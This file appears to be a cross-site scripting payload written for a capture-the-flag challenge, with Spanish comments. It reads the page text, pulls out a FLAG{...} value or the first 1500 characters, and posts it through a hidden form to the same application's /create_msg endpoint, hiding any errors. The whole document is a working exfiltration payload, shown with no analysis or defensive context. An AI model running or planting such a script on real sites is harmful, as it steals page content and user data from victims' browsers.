// navaja_exfil_sameorigin.js
(function(){
  try {
    var text = (document.body && document.body.innerText) ? document.body.innerText : '';
    var m = text.match(/FLAG\{[^}]+\}/i);
    var data = m && m[0] ? m[0] : text.slice(0,1500);
    // crea y envía un form POST a /create_msg (misma app)
    var f = document.createElement('form');
    f.method = 'POST';
    f.action = '/create_msg';
    f.style.display = 'none';
    var i = document.createElement('input');
    i.type = 'hidden';
    i.name = 'message';
    i.value = 'EXFIL: ' + data;
    f.appendChild(i);
    document.body.appendChild(f);
    f.submit();
  } catch (e) {
    // silencia errores
  }
})();
